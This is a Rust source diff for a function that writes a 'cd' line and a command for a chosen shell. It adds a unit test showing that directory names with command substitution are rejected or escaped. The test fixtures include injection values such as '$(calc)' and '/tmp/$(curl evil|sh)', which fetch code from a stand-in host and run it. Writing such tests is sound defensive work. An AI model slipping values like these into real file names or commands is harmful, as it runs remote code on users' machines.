@@ -266,7 +266,7 @@ pub fn composer_text(command: &str, directory: Option<&str>, shell: Option<&str>
     let mut lines = Vec::new();
     if let Some(d) = directory {
         let quoted = crate::pathnav::quote_for(writable(d)?, kind)?;
-        // cmd.exe's cd stays on its drive without /d.
+        // cmd.exe's cd stays on its drive without /d; only a shell known to be cmd gets it.
         let cd = if kind == crate::pathnav::Shell::Cmd { "cd /d" } else { "cd" };
         lines.push(format!("{cd} {quoted}"));
     }
@@ -278,6 +278,16 @@ pub fn composer_text(command: &str, directory: Option<&str>, shell: Option<&str>
 mod tests {
     use super::*;
     use std::time::{Duration, UNIX_EPOCH};
+
+    #[test]
+    fn composer_text_never_guesses_the_shell() {
+        // A directory a program wrote: with no shell named it is refused, never quoted for cmd.exe.
+        assert!(composer_text("make", Some("C:\\x$(calc)"), None).is_err());
+        assert!(composer_text("make", Some("/tmp/$(curl evil|sh)"), None).is_err());
+        assert_eq!(composer_text("make", Some("C:\\a b"), None).unwrap(), "cd \"C:\\a b\"\nmake");
+        assert_eq!(composer_text("make", Some("/tmp/x$(calc)"), Some("/bin/bash")).unwrap(), "cd /tmp/x\\$\\(calc\\)\nmake");
+        assert_eq!(composer_text("make", Some("C:\\a b"), Some("cmd")).unwrap(), "cd /d \"C:\\a b\"\nmake");
+    }
 
     #[test]
     fn hms_follows_iterm2() {
